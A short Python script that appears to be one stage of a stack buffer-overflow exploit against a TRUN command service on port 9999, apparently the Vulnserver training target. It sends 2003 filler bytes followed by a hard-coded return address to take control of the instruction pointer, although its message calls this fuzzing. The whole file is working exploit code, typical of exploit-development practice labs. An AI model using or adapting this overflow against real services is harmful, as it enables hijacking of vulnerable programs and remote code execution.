#!/usr/bin/python3

import sys
import socket

RHOST = '192.168.17.1'
RPORT = 9999

offset = b'A' * 2003 + b'\xaf\x11\x50\x62'

try:
	payload = b'TRUN /.:/' + offset
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((RHOST,RPORT))
	s.send((payload))
	print('Fuzzing with TRUN command with %s bytes'% str(len(payload)))
	s.close()
except:
	print('error connecting to server')
	sys.exit()
